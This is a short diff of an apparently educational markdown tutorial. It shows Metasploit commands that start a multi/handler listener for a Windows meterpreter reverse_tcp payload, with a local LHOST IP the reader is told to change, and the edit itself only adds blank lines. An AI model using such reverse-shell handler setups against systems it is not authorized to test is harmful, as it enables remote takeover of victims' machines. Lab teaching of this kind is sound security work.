@@ -59,12 +59,19 @@ $`sudo su -`
 Now, let's start the Metasploit handler.
 
 root@DESKTOP-I1T2G01:/tmp/# `msfconsole -q`
+
 msf5 > `use exploit/multi/handler`
+
 msf5 exploit(multi/handler) > `set PAYLOAD windows/meterpreter/reverse_tcp`
+
 PAYLOAD => windows/meterpreter/reverse_tcp
+
 msf5 exploit(multi/handler) > `set LHOST 172.26.19.133`
+
 Remember, your IP will be different!
+
 msf5 exploit(multi/handler) > `exploit`
+
 
 It should look like this:
 
